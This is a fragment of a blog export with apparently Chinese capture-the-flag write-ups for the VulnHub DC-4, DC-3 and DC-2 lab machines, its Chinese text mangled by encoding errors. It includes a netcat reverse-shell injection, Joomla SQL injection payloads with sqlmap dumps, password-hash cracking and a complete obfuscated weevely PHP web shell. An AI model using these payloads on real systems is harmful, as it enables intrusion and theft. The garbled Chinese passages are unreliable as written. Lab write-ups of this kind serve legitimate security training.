<p>If you enjoyed this CTF, send me a tweet via @DCAU7.<br>**root@dc-4:/root# **</p>
</blockquote>
<br>
<br>

<p>æ€»ç»“</p>
<ul>
<li>nmapæ‰«ç½‘æ®µï¼Œé¶æœºç«¯å£</li>
<li>dirsearchæ‰«ç›®å½•</li>
<li>burpsuiteçˆ†ç ´åå°</li>
<li>è¿›å…¥åå°å‘ç°èƒ½æ‰§è¡Œéƒ¨åˆ†å‘½ä»¤å¹¶æŠ“åŒ…ä¿®æ”¹å‘ç°èƒ½å‘½ä»¤æ‰§è¡Œ</li>
<li>åå¼¹shell<blockquote>
<p>åå¼¹shell<br>kali@kali2020:~$ nc -lvp 8888<br>burpæ”¹åŒ…<br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run<br>ä½¿ç”¨pythonå¾—åˆ°äº¤äº’å¼shell<br>python -c â€˜import pty;pty.spawn(â€œ/bin/bashâ€)â€™</p>
</blockquote>
</li>
<li>cat /etc/passwd å‘ç°ä¸‰ä¸ªç”¨æˆ·ï¼Œå¹¶æŸ¥çœ‹ä¿¡æ¯</li>
<li>sshç”¨æˆ·çˆ†ç ´</li>
<li><strong>teeheeææƒ</strong><blockquote>
<p>teeheeå¯é€šè¿‡echo â€œxxxâ€|sudo teehee -a â€˜fileâ€™çš„æ–¹å¼å°†å†…å®¹å†™å…¥åˆ°ç”¨æˆ·æ— æ³•ç›´æ¥æ“ä½œçš„æ–‡ä»¶ä¸­</p>
</blockquote>
</li>
<li>åˆ›å»ºç®¡ç†å‘˜èº«ä»½å¹¶åˆ‡æ¢</li>
<li>å¾—åˆ°flag</li>
</ul>
<br>

<br>

<br>

<br>

<p>Reference</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p>
<p><a href="https://www.pianshen.com/article/9999990100/">https://www.pianshen.com/article/9999990100/</a></p>
<p><a href="https://blog.csdn.net/Nicky_Zheng/article/details/113173929">https://blog.csdn.net/Nicky_Zheng/article/details/113173929</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>proxychain4é…ç½®â€”â€”è™šæ‹Ÿæœºæ— æ³•æ­£å¸¸èµ°ä»£ç†</title>
    <url>/posts/45d6c023/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>DCchallenges3</title>
    <url>/posts/93e5b017/</url>
    <content><![CDATA[<ul>
<li>ç¯å¢ƒ</li>
</ul>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>é¶æœº 192.168.18.134</p>
</blockquote>
<p>nmapæ‰«æç½‘æ®µ</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:09 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00010s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.134<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:83:96:86 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00033s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.01 seconds</p>
</blockquote>
<p>æ‰«æé¶æœºå¼€æ”¾ç«¯å£</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.134 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:11 CST<br>Nmap scan report for 192.168.18.134<br>Host is up (0.0014s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>MAC Address: 00:0C:29:83:96:86 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds</p>
</blockquote>
<p>åªå¼€æ”¾äº†80ç«¯å£</p>
<p>dirsearchæ‰«ä¸€ä¸‹ç›®å½•</p>
<blockquote>
<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.134:80</p>
<br>

<p>æ‰«åˆ°äº†ç®¡ç†å‘˜ç™»å½•é¡µé¢</p>
<p><a href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a></p>
</blockquote>
<p>æ‰“å¼€ä¸»é¡µæœ‰è¯´æ˜</p>
<blockquote>
<p>Welcome to DC-3.</p>
<p>This time, there is only one flag, one entry point and no clues.</p>
<p>To get the flag, youâ€™ll obviously have to gain root privileges.</p>
<p>How you get to be root is up to you - and, obviously, the system.</p>
<p>Good luck - and I hope you enjoy this little challenge.  :-)</p>
</blockquote>
<p>è¿™æ¬¡åªæœ‰ä¸€ä¸ªflagç›¸åº”å¾—åˆ°flagå°±è¦å¾—åˆ°rootæƒé™</p>
<p>è®¿é—®administratoré¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯Joomlaæ­å»ºçš„å¹³å°</p>
<p>åœ¨ç½‘ä¸Šæœäº†ä¸‹å‘ç°æœ‰ä¸€æ¬¾JoomScanï¼Œå®‰è£…<code>sudo git clone https://github.com/rezasp/joomscan.git</code></p>
<blockquote>
<p>perl joomscan.pl -u 192.168.18.134  </p>
<p>[+] FireWall Detector<br>[++] Firewall not detected</p>
<p>[+] Detecting Joomla Version<br>[++] Joomla 3.7.0</p>
<p>[+] Core Joomla Vulnerability<br>[++] Target Joomla core is not vulnerable                                                     </p>
<p>[+] Checking Directory Listing<br>[++] directory has directory listing :<br><a href="http://192.168.18.134/administrator/components">http://192.168.18.134/administrator/components</a><br><a href="http://192.168.18.134/administrator/modules">http://192.168.18.134/administrator/modules</a><br><a href="http://192.168.18.134/administrator/templates">http://192.168.18.134/administrator/templates</a><br><a href="http://192.168.18.134/images/banners">http://192.168.18.134/images/banners</a>                                                          </p>
<p>[+] Checking apache info/status files<br>[++] Readable info/status files are not found                                                 </p>
<p>[+] admin finder<br>[++] Admin page : <a href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a>                                        </p>
<p>[+] Checking robots.txt existing<br>[++] robots.txt is not found                                                                  </p>
<p>[+] Finding common backup files name<br>[++] Backup files are not found                                                               </p>
<p>[+] Finding common log files name<br>[++] error log is not found                                                                   </p>
<p>[+] Checking sensitive config.php.x file<br>[++] Readable config files are not found                                                      </p>
<p>Your Report : reports/192.168.18.134/                                 </p>
</blockquote>
<p>å‘ç°Joomalç‰ˆæœ¬ä¸º3.7.0</p>
<p>ç½‘ä¸Šæœç´¢ç›¸å…³æ¼æ´å‘ç°å­˜åœ¨SQLæ³¨å…¥</p>
<br>

<blockquote>
<p>kali@kali2020:~/Tools$ sudo searchsploit joomla 3.7.0</p>
<hr>
<p> Exploit Title                                              |  Path</p>
<hr>
<p>Joomla! 3.7.0 - â€˜com_fieldsâ€™ SQL Injection                  | php/webapps/42033.txt<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripti | php/webapps/43488.txt</p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<p><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
<blockquote>
<p>#Exploit Title: Joomla 3.7.0 - Sql Injection</p>
<p>#Date: 05-19-2017</p>
<p>#Exploit Author: Mateus Lino</p>
<p>#Reference: <a href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a></p>
<p>#Vendor Homepage: <a href="https://www.joomla.org/">https://www.joomla.org/</a></p>
<p>#Version: = 3.7.0</p>
<p>#Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</p>
<p>#CVE : - CVE-2017-8917</p>
<p>URL Vulnerable: <a href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml%27">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</a></p>
<p>Using Sqlmap: </p>
<p>sqlmap -u â€œ<a href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“level=5 â€“random-agent â€“dbs -p list[fullordering]</p>
<p>Parameter: list[fullordering] (GET)<br>    Type: boolean-based blind<br>    Title: Boolean-based blind - Parameter replace (DUAL)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</p>
<p>   Type: error-based<br>   Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</p>
<p>   Type: AND/OR time-based blind<br>   Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SEL</p>
</blockquote>
<br>

<p>ç»™å‡ºäº†å­˜åœ¨sqlæ³¨å…¥çš„url</p>
<p><code>http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</code></p>
<p>sqlmapæ³¨å…¥å‘½ä»¤</p>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
<p>å­˜åœ¨çš„sqlæ³¨å…¥ç±»å‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Type: boolean-based blind</span><br><span class="line">Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(CASE WHEN (1573&#x3D;1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END) </span><br><span class="line">Type: error-based</span><br><span class="line">Title: MySQL &gt;&#x3D; 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT 6600 FROM(SELECT COUNT(),CONCAT(0x7171767071,(SELECT (ELT(6600&#x3D;6600,1))),0x716a707671,FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)  </span><br><span class="line">Type: AND&#x2F;OR time-based blind</span><br><span class="line">Title: MySQL &gt;&#x3D; 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT * FROM (SEL</span><br></pre></td></tr></table></figure>

<p>sqlmap -u â€œ<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“random-agent â€“batch â€“dbs -p list[fullordering]</p>
<p>å¾—åˆ°æ•°æ®åº“</p>
<blockquote>
<p>available databases [5]:<br>[*] information_schema<br>[*] joomladb<br>[*] mysql<br>[*] performance_schema<br>[*] sys</p>
</blockquote>
<p>æŸ¥è¡¨å</p>
<p>sqlmap -u â€œ<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“random-agent â€“batch -D joomladb â€“tables -p list[fullordering]</p>
<blockquote>
<p>Database: joomladb<br>[76 tables]<br>+â€”â€”â€”â€”â€”â€”â€”+<br>| #__assets           |<br>| #__associations     |<br>| #__banner_clients   |<br>| #__banner_tracks    |<br>| #__banners          |<br>| #__bsms_admin       |<br>| #__bsms_books       |<br>| #__bsms_comments    |<br>| #__bsms_locations   |<br>| #__bsms_mediafiles  |<br>| #__bsms_message_typ |<br>| #__bsms_podcast     |<br>| #__bsms_series      |<br>| #__bsms_servers     |<br>| #__bsms_studies     |<br>| #__bsms_studytopics |<br>| #__bsms_teachers    |<br>| #__bsms_templatecod |<br>| #__bsms_templates   |<br>| #__bsms_timeset     |<br>| #__bsms_topics      |<br>| #__bsms_update      |<br>| #__categories       |<br>| #__contact_details  |<br>| #__content_frontpag |<br>| #__content_rating   |<br>| #__content_types    |<br>| #__content          |<br>| #_<em>contentitem_tag</em> |<br>| #__core_log_searche |<br>| #__extensions       |<br>| #__fields_categorie |<br>| #__fields_groups    |<br>| #__fields_values    |<br>| #__fields           |<br>| #__finder_filters   |<br>| #__finder_links_ter |<br>| #__finder_links     |<br>| #_<em>finder_taxonomy</em> |<br>| #__finder_taxonomy  |<br>| #__finder_terms_com |<br>| #__finder_terms     |<br>| #__finder_tokens_ag |<br>| #__finder_tokens    |<br>| #__finder_types     |<br>| #__jbsbackup_timese |<br>| #__jbspodcast_times |<br>| #__languages        |<br>| #__menu_types       |<br>| #__menu             |<br>| #__messages_cfg     |<br>| #__messages         |<br>| #__modules_menu     |<br>| #__modules          |<br>| #__newsfeeds        |<br>| #__overrider        |<br>| #__postinstall_mess |<br>| #__redirect_links   |<br>| #__schemas          |<br>| #__session          |<br>| #__tags             |<br>| #__template_styles  |<br>| #__ucm_base         |<br>| #__ucm_content      |<br>| #__ucm_history      |<br>| #__update_sites_ext |<br>| #__update_sites     |<br>| #__updates          |<br>| #__user_keys        |<br>| #__user_notes       |<br>| #__user_profiles    |<br>| #__user_usergroup_m |<br>| #__usergroups       |<br>| #__users            |<br>| #__utf8_conversion  |<br>| #__viewlevels       |<br>+â€”â€”â€”â€”â€”â€”â€”+</p>
</blockquote>
<p>æŸ¥å­—æ®µ<br>sqlmap -u â€œ<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“random-agent -p list[fullordering] -D â€œjoomladbâ€ -T â€œ#__usersâ€ â€“columns</p>
<blockquote>
<p>Database: joomladb<br>Table: #__users<br>[6 columns]<br>+â€”â€”â€”-+â€”â€”â€”â€”-+<br>| Column   | Type        |<br>+â€”â€”â€”-+â€”â€”â€”â€”-+<br>| email    | non-numeric |<br>| id       | numeric     |<br>| name     | non-numeric |<br>| params   | non-numeric |<br>| password | non-numeric |<br>| username | non-numeric |<br>+â€”â€”â€”-+â€”â€”â€”â€”-+</p>
</blockquote>
<br>

<p>sqlmap -u â€œ<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“level=5 â€“random-agent -D joomladb -T â€œ#__usersâ€ -C â€œusername,passwordâ€ â€“dump  -p list[fullordering]</p>
<blockquote>
<p>Database: joomladb<br>Table: #__users<br>[1 entry]<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+<br>| username | password                                                     |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+<br>| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+</p>
</blockquote>
<br>

<p>æŠŠå¯†ç å­˜å‚¨èµ·æ¥ä½¿ç”¨Johnçˆ†ç ´</p>
<br>

<blockquote>
<p><code>vim dc3password_hash.txt</code></p>
<p>kali@kali2020:<del>/Tools$ cat dc3password_hash.txt<br>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu<br>kali@kali2020:</del>/Tools$ sudo john dc3password_hash.txt -show<br>?:snoopy</p>
</blockquote>
<p>å¾—åˆ°å¯†ç ä¸ºsnoopy</p>
<p>å»ç™»å½•åå°(admin,snoopy),æˆåŠŸç™»å½•</p>
<p>å¯»æ‰¾å¯ä»¥ä¸Šä¼ shellçš„ä½ç½®</p>
<p>ä½¿ç”¨kaliä¸Šè‡ªå¸¦çš„weevelyï¼ˆä¸€æ¬¾webshellç®¡ç†å·¥å…·ï¼‰</p>
<blockquote>
<p>kali@kali2020:~$ weevely generate pass shell.php</p>
<p>Generated â€˜shell.phpâ€™ with password â€˜passâ€™ of 761 byte size.</p>
<p>kali@kali2020:~$ cat shell.php<br><?php
$Q='unction0/ x($t,$k){0/$0/c=strlen($k)0/;$0/l=strlen($0/t0/0/);$o="";f0/or($i=0;0/$i<$l;){for(0/$j0/0/';
$O='"0//$kh(.+)$0/kf/0/",@fi0/le_get_co0/0/ntents("php://0/i0/nput")0/,$m)==1) {0/@ob_st0/art();@e0/va';
$w='_e0/nd_cle0/an();$r=@base0/0/64_encode(@x(0/0/@gzc0/o0/m0/press($o),$k));pr0/int(0/"$p$kh$r$kf");}';
$o='$k="1a1dc0/91c";0/$k0/h="907320/5c0/69271";$k0/f="ddf0c940/4bc0/72";0/$p="Dw8BNaV0/0/He7JVExH0/0/0";f';
$Z=str_replace('iC','','criCeiCaiCteiC_funciCtiCion');
$A='=0;0/($j<$c&0/&0/$i0/<$l);$j0/++,$i++){$0/o.=$t{$i}^$k{$j};}}ret0/urn $0/o;}i0/f (@preg_0/match0/(';
$i='l0/(@gzun0/compress(0/@x(@0/base60/4_deco0/de($m[1])0/,$k)))0/;0/$o=@o0/b_get_conte0/nts();@0/o0/b';
$X=str_replace('0/','',$o.$Q.$A.$O.$i.$w);
$R=$Z('',$X);$R();
?></p>
</blockquote>
<p>å°†shell.phpä¸Šä¼ åè¿›è¡Œè¿æ¥</p>
<blockquote>
<p>kali@kali2020:~$ weevely <a href="http://192.168.18.134/templates/beez3/shell.php">http://192.168.18.134/templates/beez3/shell.php</a> pass</p>
<p>[+] weevely 4.0.1</p>
<p>[+] Target:     192.168.18.134<br>[+] Session:    /home/kali/.weevely/sessions/192.168.18.134/shell_1.session</p>
<p>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.</p>
<p>weevely&gt; shell<br>sh: 1: shell: not found<br>www-data@DC-3:/var/www/html/templates/beez3 $ whoami<br>www-data<br>www-data@DC-3:/var/www/html/templates/beez3 $ </p>
<br>
</blockquote>
<p>æƒ³åŠæ³•ææƒ</p>
<p>æŸ¥çœ‹é¶æœºç‰ˆæœ¬ï¼Œå‘ç°ä¸ºubunutu16.04 å†…æ ¸ç‰ˆæœ¬ä¸º4.4.0-21</p>
<blockquote>
<p>www-data@DC-3:/var/www/html $ uname -a<br>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux<br>www-data@DC-3:/var/www/html $  lsb_release -a<br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 16.04 LTS<br>Release:        16.04<br>Codename:       xenial</p>
</blockquote>
<p>å»æ¼æ´åº“æ‰¾ä¸‹</p>
<blockquote>
<p>kali@kali2020:~/Tools$ searchsploit -w ubuntu 16.04 4.4.0-21</p>
<hr>
<p> Exploit Title                                                                |  URL</p>
<hr>
<p>Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free          | <a href="https://www.exploit-db.com/exploits/43234">https://www.exploit-db.com/exploits/43234</a><br>Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter â€˜target_offsetâ€™ Out-of-B | <a href="https://www.exploit-db.com/exploits/40049">https://www.exploit-db.com/exploits/40049</a><br>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - â€˜AF_PACKETâ€™ Race  | <a href="https://www.exploit-db.com/exploits/47170">https://www.exploit-db.com/exploits/47170</a><br>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | <a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a><br>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation        | <a href="https://www.exploit-db.com/exploits/44298">https://www.exploit-db.com/exploits/44298</a><br>Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - â€˜netfilter target_offsetâ€™ Local  | <a href="https://www.exploit-db.com/exploits/44300">https://www.exploit-db.com/exploits/44300</a><br>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege E | <a href="https://www.exploit-db.com/exploits/43418">https://www.exploit-db.com/exploits/43418</a><br>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) | <a href="https://www.exploit-db.com/exploits/47169">https://www.exploit-db.com/exploits/47169</a><br>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege E | <a href="https://www.exploit-db.com/exploits/41760">https://www.exploit-db.com/exploits/41760</a></p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<br>

<br>

<blockquote>
<p>www-data@DC-3:/var/www $ wget  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>â€“2021-05-01 23:52:54â€“  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)â€¦ 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443â€¦ connected.<br>HTTP request sent, awaiting responseâ€¦ 302 Found<br>Location: <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>â€“2021-05-01 23:52:55â€“  <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)â€¦ ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443â€¦ failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443â€¦ failed: Connection refused.<br>www-data@DC-3:/var/www $ ls<br>html<br>www-data@DC-3:/var/www $ wget  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a></p>
<p>â€“2021-05-01 23:53:39â€“  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)â€¦ 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443â€¦ connected.<br>HTTP request sent, awaiting responseâ€¦ No data received.<br>Retrying.</p>
<p>â€“2021-05-01 23:53:56â€“  (try: 2)  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Connecting to github.com (github.com)|13.250.177.223|:443â€¦ failed: Connection refused.<br>Resolving github.com (github.com)â€¦ 13.229.188.59<br>Connecting to github.com (github.com)|13.229.188.59|:443â€¦ connected.<br>HTTP request sent, awaiting responseâ€¦ 302 Found<br>Location: <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>â€“2021-05-01 23:54:18â€“  <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)â€¦ ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443â€¦ failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443â€¦ failed: Connection refused.</p>
</blockquote>
<p>ä¸‹è½½è¶…æ—¶ï¼Œå°è¯•åœ¨kaliå…ˆä¸‹è½½åœ¨è®©é¶æœºåœ¨kialiä¸Šä¸‹è½½,æœ€è¿‘VMè™šæ‹Ÿæœºä»£ç†ä¸ç®¡ç”¨äº†è¿˜åœ¨æ’æŸ¥â€¦</p>
<br>

<br>

<br>

<br>

<br>

<br>

<p>æ€»ç»“</p>
<ul>
<li><p>nampæ‰«ç½‘æ®µå’Œé¶æœºå¼€æ”¾ç«¯å£</p>
</li>
<li><p>dirsearchæ‰«æç›®å½•</p>
</li>
<li><p>ä¿¡æ¯æœé›†(Joomal)</p>
</li>
<li><p>Joomscanæ‰«æç‰ˆæœ¬</p>
</li>
<li><p>searchsploit æŸ¥æ‰¾joomalæ¼æ´</p>
</li>
<li><p>sqlmapè·‘åå°è´¦å·å¯†ç (å¯†ç è¢«hash)</p>
</li>
<li><p>johnç ´è§£hashå¯†ç </p>
</li>
<li><p>ç™»å½•åå°ï¼Œæ‰¾ä¸Šä¼ shellçš„åœ°æ–¹</p>
</li>
<li><p>ä½¿ç”¨weevelyç”Ÿäº§ä¸€å¥è¯<code>weevely generate &lt;password&gt; b.php</code></p>
</li>
<li><p>ä½¿ç”¨weevelyè¿æ¥<code>weevely &lt;URL&gt; &lt;password&gt;</code></p>
</li>
</ul>
<p><em>weevelyä½¿ç”¨(webshell) <code>https://blog.csdn.net/qq_26090065/article/details/81235120</code></em></p>
<ul>
<li>ææƒ(æœªå®Œæˆ)</li>
</ul>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¾å¤‡ç£ç›˜/CD-ROMé…ç½®ä¸æ­£ç¡®</title>
    <url>/posts/f1a8aa3a/</url>
    <content><![CDATA[<p>IDE è®¾å¤‡ (ç£ç›˜/CD-ROM)é…ç½®ä¸æ­£ç¡®ã€‚â€œide0:1â€ä¸Šå…·æœ‰ä¸€ä¸ª IDE ä»è®¾å¤‡ï¼Œä½†æ²¡æœ‰ä¸»è®¾å¤‡ã€‚æ­¤é…ç½®åœ¨è™šæ‹Ÿæœºä¸­æ— æ³•æ­£å¸¸è¿è¡Œã€‚è¯·ä½¿ç”¨é…ç½®ç¼–è¾‘å™¨å°†ç£ç›˜/CD-ROM ä»â€œide0:1â€ç§»åˆ°â€œide0:0â€ã€‚<br>è§£å†³æ–¹æ¡ˆ:<br>è™šæ‹Ÿæœºè®¾ç½®-&gt;CD/DVD(IDE)-&gt;é«˜çº§-&gt;IDE-&gt;è®¾ç½®ä¸ºâ€™IDE 0:0  CD/DVD(IDE)â€™</p>
]]></content>
      <categories>
        <category>VM</category>
      </categories>
      <tags>
        <tag>VM</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges2</title>
    <url>/posts/e4e28081/</url>
    <content><![CDATA[<p>é¶æœºDC-2ä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
<br>

<p>ç¯å¢ƒ</p>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24</p>
<p>kali 192.168.18.131</p>
<p>é¶æœº 192.168.18.132</p>
</blockquote>
<p>æ‰«æç½‘æ®µ</p>
<blockquote>
<p>sudo nmap -sn 192.168.18.0/24</p>
